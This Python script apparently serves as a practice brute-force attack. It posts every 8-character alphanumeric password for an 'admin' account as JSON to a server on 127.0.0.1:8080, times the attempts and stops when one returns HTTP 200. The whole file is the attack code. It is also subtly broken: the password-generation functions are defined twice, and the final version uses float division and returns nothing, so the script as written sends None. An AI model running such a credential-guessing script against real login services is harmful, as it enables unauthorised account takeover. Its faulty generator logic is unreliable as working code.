import http.client
import json
import time
import requests


def send_request(password: str) -> bool:
    session = requests.Session()
    url = "http://127.0.0.1:8080/"
    payload = {
        "login": "admin", "pass": password
    }
    response = session.post(url, json=payload)
    return response.status_code == 200


# def send_request(password: str) -> bool:
#     conn = http.client.HTTPConnection("127.0.0.1", 8080)
#     payload = json.dumps({
#         "login": "admin",
#         "pass": password
#     })
#     headers = {
#         'Content-Type': 'application/json'
#     }
#     conn.request("POST", "/", payload, headers)
#     res = conn.getresponse()
#     conn.close()
#     return res.status == 200


def generatePassList(l: int, chars: str) -> list:
    m = len(chars) ** l
    print(m)
    for i in range(m):
        yield generatePass(i, l, chars)


def generatePass(i: int, l: int, chars: str) -> str:
    result = []
    base = len(chars)
    num = i
    for _ in range(l):
        result.append(chars[num % base])
        num = num // base
    return ''.join(result[::-1])


def generatePassList(l: int, chars: str) -> list:
    m = len(chars) ** l
    for i in range(m):
        yield generatePass(i, l, chars)


def generatePass(i: int, l: int, chars: str) -> str:
    result = []
    base = len(chars)
    num = i
    for _ in range(l):
        result.append(chars[int(num) % int(base)])
        num = num / base


k = 0
t = time.time_ns()
tc=2000
for password in generatePassList(8, 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'):
    # print(password)
    k += 1
    if send_request(password):
        print("OK")
        break
    # else:
    # print('FAIL')
    if k % tc == 0:
        print((time.time_ns() - t)/tc/1000)
        t = time.time_ns()

